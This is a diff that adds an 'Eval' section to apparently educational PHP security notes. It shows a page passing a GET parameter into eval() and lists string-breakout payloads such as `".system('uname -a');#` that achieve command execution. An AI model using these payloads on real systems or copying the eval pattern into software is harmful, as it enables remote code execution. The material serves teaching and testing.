@@ -58,3 +58,24 @@ if(NULL == ''){ echo "Equal"; } else{ echo "not Equal"; }
 ?>
 // Equal
 ```
+# Eval
+Always pay attention to the behaviour and aim to fix the syntax in order to acheive code execution. Taking the code below as an example, we can acheive code execution by payloads such like:
+- `".system("ls")."`
+```php
+<?php
+  if (!isset($_GET["name"])) {
+    header("Location: /?name=hacker");
+    die();
+  }
+  require "header.php";
+?>
+  $str="echo \"Hello ".$_GET['name']."!!!\";";
+  eval($str);
+?>
+<?php
+  require "footer.php";
+?>
+```
+The challenge here is to break out of the code syntax and keep a clean syntax. There are many ways to do it:
+-   By adding dummy code: `".system('uname -a'); $dummy="`
+-   By using comment: `".system('uname -a');#` or `".system('uname -a');//`
